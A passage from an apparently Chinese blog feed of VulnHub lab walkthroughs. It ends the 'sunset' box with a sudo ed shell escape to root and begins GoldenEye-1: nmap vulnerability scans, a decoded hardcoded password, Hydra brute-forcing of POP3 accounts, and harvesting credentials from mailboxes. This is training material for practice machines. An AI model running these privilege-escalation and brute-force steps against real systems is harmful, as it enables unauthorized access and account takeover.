/usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Sun Jul 28 20:52:38 2019 from 192.168.1.182</span><br><span class="line">sunset@sunset:~$ id</span><br><span class="line">uid=1000(sunset) gid=1000(sunset) groups=1000(sunset),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),115(lpadmin),116(scanner)</span><br><span class="line">sunset@sunset:~$ whoami</span><br><span class="line">sunset</span><br><span class="line">sunset@sunset:~$ ls</span><br><span class="line">user.txt</span><br><span class="line">sunset@sunset:~$ cat user.txt</span><br><span class="line">5b5b8e9b01ef27a1cc0a2d5fa87d7190</span><br><span class="line">sunset@sunset:~$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> sunset on sunset:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User sunset may run the following commands on sunset:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/ed</span><br><span class="line">sunset@sunset:~$ sudo /usr/bin/ed</span><br><span class="line">id</span><br><span class="line">?</span><br><span class="line">!/bin/sh</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line"><span class="comment"># pwd</span></span><br><span class="line">/home/sunset</span><br><span class="line"><span class="comment"># cd /root</span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">flag.txt  ftp  server.sh</span><br><span class="line"><span class="comment"># cat flag.txt</span></span><br><span class="line">25d7ce0ee3cbf71efbac61f85d0c14fe</span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub256.jpg"></li>
</ul>
<h3 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h3><ul>
<li>ftp anonymous用户免密码登录</li>
<li>john破解linux sha512 hash值</li>
<li>hashcat破解linux sha512 hash值</li>
<li>sudo无需密码ed通过!/bin/sh提权</li>
</ul>
<p><font color="red">Game over</font></p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[GoldenEye-1]</title>
    <url>/2020/01/08/GoldenEye-1/</url>
    <content><![CDATA[<h3 id="发布日期"><a href="#发布日期" class="headerlink" title="发布日期"></a>发布日期</h3><p>名称：GoldenEye：1<br>发布日期：2018年5月4日</p>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><ul>
<li>Download: <span class="exturl" data-url="aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL29wZW4/aWQ9MU03bU1kU01ISHBpRktXM0pMcXE4Ym9Ockk5NU52NHRx">https://drive.google.com/open?id=1M7mMdSMHHpiFKW3JLqq8boNrI95Nv4tq<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9nb2xkZW5leWUvR29sZGVuRXllLXYxLm92YQ==">https://download.vulnhub.com/goldeneye/GoldenEye-v1.ova<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9nb2xkZW5leWUvR29sZGVuRXllLXYxLm92YS50b3JyZW50">https://download.vulnhub.com/goldeneye/GoldenEye-v1.ova.torrent<i class="fa fa-external-link-alt"></i></span> </li>
</ul>
<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>级别：中级</p>
<p>最近完成了创建OSCP型易受攻击的计算机的工作，该计算机的主题是伟大的James Bond电影（甚至更好的n64游戏）GoldenEye。目标是root并捕获秘密的GoldenEye代码-flag.txt。我认为它是中级的，它具有root所需的多种技术-没有漏洞利用开发/缓冲区溢出。在完成OSCP之后，我认为这将是一个不错的实践，另外还有一点CTF风味。我已经在VMware和VirtualBox上创建并验证。除了默认情况下，您不需要其他工具。将需要设置为“host only”，并且在VMware上，由于格式化，在最初启动它时，如果出现提示，可能需要单击“重试”。</p>
<p>Beta-2018-05-02 v1-2018-05-04</p>
<p>GoldenEye是由creosote发起并在Vulnhub举办的一项以秘密服务为主题的挑战。GoldenEye是一个CTF样式的框，而不是现实的渗透测试方案。此框需要相当多的“即开即用”的思想，才能找到根源。</p>
<a id="more"></a>

<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.56.0/24</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.101</span><br><span class="line">Host is up (0.00025s latency).</span><br><span class="line">MAC Address: 08:00:27:3B:86:3C (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -p- -n -Pn -v -sV 192.168.56.101</span></span><br><span class="line">PORT      STATE SERVICE     VERSION</span><br><span class="line">25/tcp    open  smtp        Postfix smtpd</span><br><span class="line">80/tcp    open  http        Apache httpd 2.4.7 ((Ubuntu))</span><br><span class="line">55006/tcp open  ssl/unknown</span><br><span class="line">55007/tcp open  pop3        Dovecot pop3d</span><br></pre></td></tr></table></figure>
<p>除了在端口80上运行的Web应用程序之外，还有两个pop3端口和一个smtp端口。建议使用主应用程序导航到/sev-home/。但是，该应用程序在浏览到/sev-home/时提示输入用户名和密码，而我对凭证还一无所知。</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub132.jpg"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -p 25,80,55006,55007 -A -v -Pn -n -sV -T5 --script=vuln --min-rate=10000 192.168.56.101</span></span><br><span class="line">PORT      STATE SERVICE     VERSION</span><br><span class="line">25/tcp    open  smtp        Postfix smtpd</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| smtp-vuln-cve2010-4344: </span><br><span class="line">|_  The SMTP server is not Exim: NOT VULNERABLE</span><br><span class="line">| ssl-dh-params: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Anonymous Diffie-Hellman Key Exchange MitM Vulnerability</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|       Transport Layer Security (TLS) services that use anonymous</span><br><span class="line">|       Diffie-Hellman key exchange only provide protection against passive</span><br><span class="line">|       eavesdropping, and are vulnerable to active man-in-the-middle attacks</span><br><span class="line">|       <span class="built_in">which</span> could completely compromise the confidentiality and integrity</span><br><span class="line">|       of any data exchanged over the resulting session.</span><br><span class="line">|     Check results:</span><br><span class="line">|       ANONYMOUS DH GROUP 1</span><br><span class="line">|             Cipher Suite: TLS_DH_anon_WITH_AES_128_CBC_SHA</span><br><span class="line">|             Modulus Type: Safe prime</span><br><span class="line">|             Modulus Source: postfix <span class="built_in">builtin</span></span><br><span class="line">|             Modulus Length: 1024</span><br><span class="line">|             Generator Length: 8</span><br><span class="line">|             Public Key Length: 1024</span><br><span class="line">|     References:</span><br><span class="line">|       https://www.ietf.org/rfc/rfc2246.txt</span><br><span class="line">|   </span><br><span class="line">|   Transport Layer Security (TLS) Protocol DHE_EXPORT Ciphers Downgrade MitM (Logjam)</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  BID:74733  CVE:CVE-2015-4000</span><br><span class="line">|       The Transport Layer Security (TLS) protocol contains a flaw that is</span><br><span class="line">|       triggered when handling Diffie-Hellman key exchanges defined with</span><br><span class="line">|       the DHE_EXPORT cipher. This may allow a man-in-the-middle attacker</span><br><span class="line">|       to downgrade the security of a TLS session to 512-bit <span class="built_in">export</span>-grade</span><br><span class="line">|       cryptography, <span class="built_in">which</span> is significantly weaker, allowing the attacker</span><br><span class="line">|       to more easily <span class="built_in">break</span> the encryption and monitor or tamper with</span><br><span class="line">|       the encrypted stream.</span><br><span class="line">|     Disclosure date: 2015-5-19</span><br><span class="line">|     Check results:</span><br><span class="line">|       EXPORT-GRADE DH GROUP 1</span><br><span class="line">|             Cipher Suite: TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA</span><br><span class="line">|             Modulus Type: Safe prime</span><br><span class="line">|             Modulus Source: Unknown/Custom-generated</span><br><span class="line">|             Modulus Length: 512</span><br><span class="line">|             Generator Length: 8</span><br><span class="line">|             Public Key Length: 512</span><br><span class="line">|     References:</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000</span><br><span class="line">|       https://weakdh.org</span><br><span class="line">|       https://www.securityfocus.com/bid/74733</span><br><span class="line">|   </span><br><span class="line">|   Diffie-Hellman Key Exchange Insufficient Group Strength</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|       Transport Layer Security (TLS) services that use Diffie-Hellman groups</span><br><span class="line">|       of insufficient strength, especially those using one of a few commonly</span><br><span class="line">|       shared groups, may be susceptible to passive eavesdropping attacks.</span><br><span class="line">|     Check results:</span><br><span class="line">|       WEAK DH GROUP 1</span><br><span class="line">|             Cipher Suite: TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA</span><br><span class="line">|             Modulus Type: Safe prime</span><br><span class="line">|             Modulus Source: postfix <span class="built_in">builtin</span></span><br><span class="line">|             Modulus Length: 1024</span><br><span class="line">|             Generator Length: 8</span><br><span class="line">|             Public Key Length: 1024</span><br><span class="line">|     References:</span><br><span class="line">|_      https://weakdh.org</span><br><span class="line">| ssl-poodle: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   SSL POODLE information leak</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  BID:70574  CVE:CVE-2014-3566</span><br><span class="line">|           The SSL protocol 3.0, as used <span class="keyword">in</span> OpenSSL through 1.0.1i and other</span><br><span class="line">|           products, uses nondeterministic CBC padding, <span class="built_in">which</span> makes it easier</span><br><span class="line">|           <span class="keyword">for</span> man-in-the-middle attackers to obtain cleartext data via a</span><br><span class="line">|           padding-oracle attack, aka the <span class="string">&quot;POODLE&quot;</span> issue.</span><br><span class="line">|     Disclosure date: 2014-10-14</span><br><span class="line">|     Check results:</span><br><span class="line">|       TLS_RSA_WITH_AES_128_CBC_SHA</span><br><span class="line">|     References:</span><br><span class="line">|       https://www.imperialviolet.org/2014/10/14/poodle.html</span><br><span class="line">|       https://www.securityfocus.com/bid/70574</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566</span><br><span class="line">|_      https://www.openssl.org/~bodo/ssl-poodle.pdf</span><br><span class="line">|_sslv2-drown: </span><br><span class="line">80/tcp    open  http        Apache httpd 2.4.7 ((Ubuntu))</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-csrf: Couldn<span class="string">&#x27;t find any CSRF vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.</span><br><span class="line">|_http-server-header: Apache/2.4.7 (Ubuntu)</span><br><span class="line">| http-slowloris-check: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Slowloris DOS attack</span><br><span class="line">|     State: LIKELY VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2007-6750</span><br><span class="line">|       Slowloris tries to keep many connections to the target web server open and hold</span><br><span class="line">|       them open as long as possible.  It accomplishes this by opening connections to</span><br><span class="line">|       the target web server and sending a partial request. By doing so, it starves</span><br><span class="line">|       the http server<span class="string">&#x27;s resources causing Denial Of Service.</span></span><br><span class="line"><span class="string">|       </span></span><br><span class="line"><span class="string">|     Disclosure date: 2009-09-17</span></span><br><span class="line"><span class="string">|     References:</span></span><br><span class="line"><span class="string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</span></span><br><span class="line"><span class="string">|_      http://ha.ckers.org/slowloris/</span></span><br><span class="line"><span class="string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.</span><br><span class="line">55006/tcp open  ssl/unknown</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| ssl-dh-params: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Diffie-Hellman Key Exchange Insufficient Group Strength</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|       Transport Layer Security (TLS) services that use Diffie-Hellman groups</span><br><span class="line">|       of insufficient strength, especially those using one of a few commonly</span><br><span class="line">|       shared groups, may be susceptible to passive eavesdropping attacks.</span><br><span class="line">|     Check results:</span><br><span class="line">|       WEAK DH GROUP 1</span><br><span class="line">|             Cipher Suite: TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA</span><br><span class="line">|             Modulus Type: Safe prime</span><br><span class="line">|             Modulus Source: Unknown/Custom-generated</span><br><span class="line">|             Modulus Length: 1024</span><br><span class="line">|             Generator Length: 8</span><br><span class="line">|             Public Key Length: 1024</span><br><span class="line">|     References:</span><br><span class="line">|_      https://weakdh.org</span><br><span class="line">| ssl-poodle: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   SSL POODLE information leak</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  BID:70574  CVE:CVE-2014-3566</span><br><span class="line">|           The SSL protocol 3.0, as used <span class="keyword">in</span> OpenSSL through 1.0.1i and other</span><br><span class="line">|           products, uses nondeterministic CBC padding, <span class="built_in">which</span> makes it easier</span><br><span class="line">|           <span class="keyword">for</span> man-in-the-middle attackers to obtain cleartext data via a</span><br><span class="line">|           padding-oracle attack, aka the <span class="string">&quot;POODLE&quot;</span> issue.</span><br><span class="line">|     Disclosure date: 2014-10-14</span><br><span class="line">|     Check results:</span><br><span class="line">|       TLS_RSA_WITH_AES_128_CBC_SHA</span><br><span class="line">|     References:</span><br><span class="line">|       https://www.imperialviolet.org/2014/10/14/poodle.html</span><br><span class="line">|       https://www.securityfocus.com/bid/70574</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566</span><br><span class="line">|_      https://www.openssl.org/~bodo/ssl-poodle.pdf</span><br><span class="line">|_sslv2-drown: </span><br><span class="line">55007/tcp open  pop3        Dovecot pop3d</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| ssl-dh-params: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Diffie-Hellman Key Exchange Insufficient Group Strength</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|       Transport Layer Security (TLS) services that use Diffie-Hellman groups</span><br><span class="line">|       of insufficient strength, especially those using one of a few commonly</span><br><span class="line">|       shared groups, may be susceptible to passive eavesdropping attacks.</span><br><span class="line">|     Check results:</span><br><span class="line">|       WEAK DH GROUP 1</span><br><span class="line">|             Cipher Suite: TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA</span><br><span class="line">|             Modulus Type: Safe prime</span><br><span class="line">|             Modulus Source: Unknown/Custom-generated</span><br><span class="line">|             Modulus Length: 1024</span><br><span class="line">|             Generator Length: 8</span><br><span class="line">|             Public Key Length: 1024</span><br><span class="line">|     References:</span><br><span class="line">|_      https://weakdh.org</span><br><span class="line">| ssl-poodle: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   SSL POODLE information leak</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  BID:70574  CVE:CVE-2014-3566</span><br><span class="line">|           The SSL protocol 3.0, as used <span class="keyword">in</span> OpenSSL through 1.0.1i and other</span><br><span class="line">|           products, uses nondeterministic CBC padding, <span class="built_in">which</span> makes it easier</span><br><span class="line">|           <span class="keyword">for</span> man-in-the-middle attackers to obtain cleartext data via a</span><br><span class="line">|           padding-oracle attack, aka the <span class="string">&quot;POODLE&quot;</span> issue.</span><br><span class="line">|     Disclosure date: 2014-10-14</span><br><span class="line">|     Check results:</span><br><span class="line">|       TLS_RSA_WITH_AES_128_CBC_SHA</span><br><span class="line">|     References:</span><br><span class="line">|       https://www.imperialviolet.org/2014/10/14/poodle.html</span><br><span class="line">|       https://www.securityfocus.com/bid/70574</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566</span><br><span class="line">|_      https://www.openssl.org/~bodo/ssl-poodle.pdf</span><br><span class="line">|_sslv2-drown:</span><br></pre></td></tr></table></figure>

<p>是时候深入挖掘了！在页面的HTML源代码中，找出了负责漂亮的首页动画的JavaScript文件。在terminal.js上，我找到了第一个提示。用于以HTML编码编码的boris的硬编码密码，这对于解码非常简单。我获得了访问该应用程序的凭据。</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub133.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub134.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub135.jpg"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&amp;<span class="comment">#73;&amp;#110;&amp;#118;&amp;#105;&amp;#110;&amp;#99;&amp;#105;&amp;#98;&amp;#108;&amp;#101;&amp;#72;&amp;#97;&amp;#99;&amp;#107;&amp;#51;&amp;#114;</span></span><br><span class="line"></span><br><span class="line">===&gt;</span><br><span class="line"></span><br><span class="line">InvincibleHack3r</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>得到账号密码：boris/InvincibleHack3r，然后登录</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub136.jpg"></p>
<p>访问该应用程序没有任何用处。尝试使用相同的凭据访问pop3服务，并检查了鲍里斯经纪人是否有任何有趣的电子邮件。但是，获得的密码不适合用于pop3访问。老实说，在这里停留了一段时间。<br>没有其他线索，对使用用户名boris的pop3服务进行了快速的暴力破解。Hydra能够使用Kali中存在的fasttrack.txt单词列表来破解密码。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># hydra -l boris -P /usr/share/wordlists/fasttrack.txt -t20 192.168.56.101 -s55007 -I pop3Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.</span></span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-01-09 21:37:45</span><br><span class="line">[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!</span><br><span class="line">[DATA] max 20 tasks per 1 server, overall 20 tasks, 222 login tries (l:1/p:222), ~12 tries per task</span><br><span class="line">[DATA] attacking pop3://192.168.56.101:55007/</span><br><span class="line">[STATUS] 100.00 tries/min, 100 tries <span class="keyword">in</span> 00:01h, 122 to <span class="keyword">do</span> <span class="keyword">in</span> 00:02h, 20 active</span><br><span class="line">[55007][pop3] host: 192.168.56.101   login: boris   password: secret1!</span><br><span class="line">[STATUS] 111.00 tries/min, 222 tries <span class="keyword">in</span> 00:02h, 1 to <span class="keyword">do</span> <span class="keyword">in</span> 00:01h, 19 active</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-01-09 21:39:45</span><br></pre></td></tr></table></figure>

<p>得到boris/secret1!，然后telnet连接</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># telnet 192.168.56.101 55007</span></span><br><span class="line">Trying 192.168.56.101...</span><br><span class="line">Connected to 192.168.56.101.</span><br><span class="line">Escape character is <span class="string">&#x27;^]&#x27;</span>.</span><br><span class="line">+OK GoldenEye POP3 Electronic-Mail System</span><br><span class="line">user boris</span><br><span class="line">+OK</span><br><span class="line">pass secret1!</span><br><span class="line">+OK Logged <span class="keyword">in</span>.</span><br><span class="line">retr 1</span><br><span class="line">+OK 544 octets</span><br><span class="line">Return-Path: &lt;root@127.0.0.1.goldeneye&gt;</span><br><span class="line">X-Original-To: boris</span><br><span class="line">Delivered-To: boris@ubuntu</span><br><span class="line">Received: from ok (localhost [127.0.0.1])</span><br><span class="line">        by ubuntu (Postfix) with SMTP id D9E47454B1</span><br><span class="line">        <span class="keyword">for</span> &lt;boris&gt;; Tue, 2 Apr 1990 19:22:14 -0700 (PDT)</span><br><span class="line">Message-Id: &lt;20180425022326.D9E47454B1@ubuntu&gt;</span><br><span class="line">Date: Tue, 2 Apr 1990 19:22:14 -0700 (PDT)</span><br><span class="line">From: root@127.0.0.1.goldeneye</span><br><span class="line"></span><br><span class="line">Boris, this is admin. You can electronically communicate to co-workers and students here. I<span class="string">&#x27;m not going to scan emails for security risks because I trust you and the other admins here.</span></span><br><span class="line"><span class="string">.</span></span><br><span class="line"><span class="string">retr 2</span></span><br><span class="line"><span class="string">+OK 373 octets</span></span><br><span class="line"><span class="string">Return-Path: &lt;natalya@ubuntu&gt;</span></span><br><span class="line"><span class="string">X-Original-To: boris</span></span><br><span class="line"><span class="string">Delivered-To: boris@ubuntu</span></span><br><span class="line"><span class="string">Received: from ok (localhost [127.0.0.1])</span></span><br><span class="line"><span class="string">        by ubuntu (Postfix) with ESMTP id C3F2B454B1</span></span><br><span class="line"><span class="string">        for &lt;boris&gt;; Tue, 21 Apr 1995 19:42:35 -0700 (PDT)</span></span><br><span class="line"><span class="string">Message-Id: &lt;20180425024249.C3F2B454B1@ubuntu&gt;</span></span><br><span class="line"><span class="string">Date: Tue, 21 Apr 1995 19:42:35 -0700 (PDT)</span></span><br><span class="line"><span class="string">From: natalya@ubuntu</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Boris, I can break your codes!</span></span><br><span class="line"><span class="string">.</span></span><br><span class="line"><span class="string">retr 3</span></span><br><span class="line"><span class="string">+OK 921 octets</span></span><br><span class="line"><span class="string">Return-Path: &lt;alec@janus.boss&gt;</span></span><br><span class="line"><span class="string">X-Original-To: boris</span></span><br><span class="line"><span class="string">Delivered-To: boris@ubuntu</span></span><br><span class="line"><span class="string">Received: from janus (localhost [127.0.0.1])</span></span><br><span class="line"><span class="string">        by ubuntu (Postfix) with ESMTP id 4B9F4454B1</span></span><br><span class="line"><span class="string">        for &lt;boris&gt;; Wed, 22 Apr 1995 19:51:48 -0700 (PDT)</span></span><br><span class="line"><span class="string">Message-Id: &lt;20180425025235.4B9F4454B1@ubuntu&gt;</span></span><br><span class="line"><span class="string">Date: Wed, 22 Apr 1995 19:51:48 -0700 (PDT)</span></span><br><span class="line"><span class="string">From: alec@janus.boss</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Boris,</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Your cooperation with our syndicate will pay off big. Attached are the final access codes for GoldenEye. Place them in a hidden file within the root directory of this server then remove from this email. There can only be one set of these acces codes, and we need to secure them for the final execution. If they are retrieved and captured our plan will crash and burn!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal codes we will push to our final stages....</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">PS - Keep security tight or we will be compromised.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">.</span></span><br></pre></td></tr></table></figure>

<p>电子邮件通讯的内容不可直接利用，但能够找出执行任务的其他特工的用户名。这也可以用于对其他代理发起相同的攻击。很幸运找到了natalya。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># hydra -l natalya -P /usr/share/wordlists/fasttrack.txt -t64 192.168.56.101 -s55007 -I pop3</span></span><br><span class="line">Hydra v9.0 (c) 2019 by van Hauser/THC - Please <span class="keyword">do</span> not use <span class="keyword">in</span> military or secret service organizations, or <span class="keyword">for</span> illegal purposes.</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-01-09 21:46:23</span><br><span class="line">[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!</span><br><span class="line">[DATA] max 64 tasks per 1 server, overall 64 tasks, 222 login tries (l:1/p:222), ~4 tries per task</span><br><span class="line">[DATA] attacking pop3://192.168.56.101:55007/</span><br><span class="line">[55007][pop3] host: 192.168.56.101   login: natalya   password: bird</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-01-09 21:46:39</span><br></pre></td></tr></table></figure>

<p>natalya/bird，登录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># telnet 192.168.56.101 55007</span></span><br><span class="line">Trying 192.168.56.101...</span><br><span class="line">Connected to 192.168.56.101.</span><br><span class="line">Escape character is <span class="string">&#x27;^]&#x27;</span>.</span><br><span class="line">+OK GoldenEye POP3 Electronic-Mail System</span><br><span class="line">user natalya</span><br><span class="line">+OK</span><br><span class="line">pass bird</span><br><span class="line">+OK Logged <span class="keyword">in</span>.</span><br><span class="line">retr 1</span><br><span class="line">+OK 631 octets</span><br><span class="line">Return-Path: &lt;root@ubuntu&gt;</span><br><span class="line">X-Original-To: natalya</span><br><span class="line">Delivered-To: natalya@ubuntu</span><br><span class="line">Received: from ok (localhost [127.0.0.1])</span><br><span class="line">        by ubuntu (Postfix) with ESMTP id D5EDA454B1</span><br><span class="line">        <span class="keyword">for</span> &lt;natalya&gt;; Tue, 10 Apr 1995 19:45:33 -0700 (PDT)</span><br><span class="line">Message-Id: &lt;20180425024542.D5EDA454B1@ubuntu&gt;</span><br><span class="line">Date: Tue, 10 Apr 1995 19:45:33 -0700 (PDT)</span><br><span class="line">From: root@ubuntu</span><br><span class="line"></span><br><span class="line">Natalya, please you need to stop breaking boris<span class="string">&#x27; codes. Also, you are GNO supervisor for training. I will email you once a student is designated to you.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Also, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Janus.</span></span><br><span class="line"><span class="string">.</span></span><br><span class="line"><span class="string">retr 2</span></span><br><span class="line"><span class="string">+OK 1048 octets</span></span><br><span class="line"><span class="string">Return-Path: &lt;root@ubuntu&gt;</span></span><br><span class="line"><span class="string">X-Original-To: natalya</span></span><br><span class="line"><span class="string">Delivered-To: natalya@ubuntu</span></span><br><span class="line"><span class="string">Received: from root (localhost [127.0.0.1])</span></span><br><span class="line"><span class="string">        by ubuntu (Postfix) with SMTP id 17C96454B1</span></span><br><span class="line"><span class="string">        for &lt;natalya&gt;; Tue, 29 Apr 1995 20:19:42 -0700 (PDT)</span></span><br><span class="line"><span class="string">Message-Id: &lt;20180425031956.17C96454B1@ubuntu&gt;</span></span><br><span class="line"><span class="string">Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT)</span></span><br><span class="line"><span class="string">From: root@ubuntu</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it&#x27;</span>s related to security...even <span class="keyword">if</span> it<span class="string">&#x27;s not, just enter it in under the guise of &quot;security&quot;...it&#x27;</span>ll get the change order escalated without much hassle :)</span><br><span class="line"></span><br><span class="line">Ok, user creds are:</span><br><span class="line"></span><br><span class="line">username: xenia</span><br><span class="line">password: RCP90rulez!</span><br><span class="line"></span><br><span class="line">Boris verified her as a valid contractor so just create the account ok?</span><br><span class="line"></span><br><span class="line">And <span class="keyword">if</span> you didn<span class="string">&#x27;t have the URL on outr internal Domain: severnaya-station.com/gnocertdir</span></span><br><span class="line"><span class="string">**Make sure to edit your host file since you usually work remote off-network....</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Since you&#x27;</span>re a Linux user just point this servers IP to severnaya-station.com <span class="keyword">in</span> /etc/hosts.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.</span><br></pre></td></tr></table></figure>

<p>将关键信息retr 2翻译</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">好的，娜塔琳，我为你准备了一个新学生。由于这是一个新系统，请让我或鲍里斯知道您是否发现任何配置问题，尤其是它与安全性有关……即使不是与安全有关，也可以以“安全性”为名输入它……无需太多麻烦就可以将变更单升级：)</span><br><span class="line">好的，用户凭证是：</span><br><span class="line"></span><br><span class="line">用户名：xenia</span><br><span class="line">密码：RCP90rulez!</span><br><span class="line"></span><br><span class="line">鲍里斯（Boris）确认她是有效承包商，所以只需创建帐户就可以了吗？如果您没有外部内部域上的URL，请访问：severnaya-station.com/gnocertdir</span><br><span class="line"></span><br><span class="line">**请确保编辑您的主机文件，因为您通常在远程网络外工作。由于您是Linux用户，只需将此服务器IP指向/etc/hosts中的severnaya-station.com。</span><br></pre></td></tr></table></figure>

<p>修改hosts文件将ip:192.168.56.101指向severnaya-station.com，然后访问域名severnaya-station.com/gnocertdir</p>
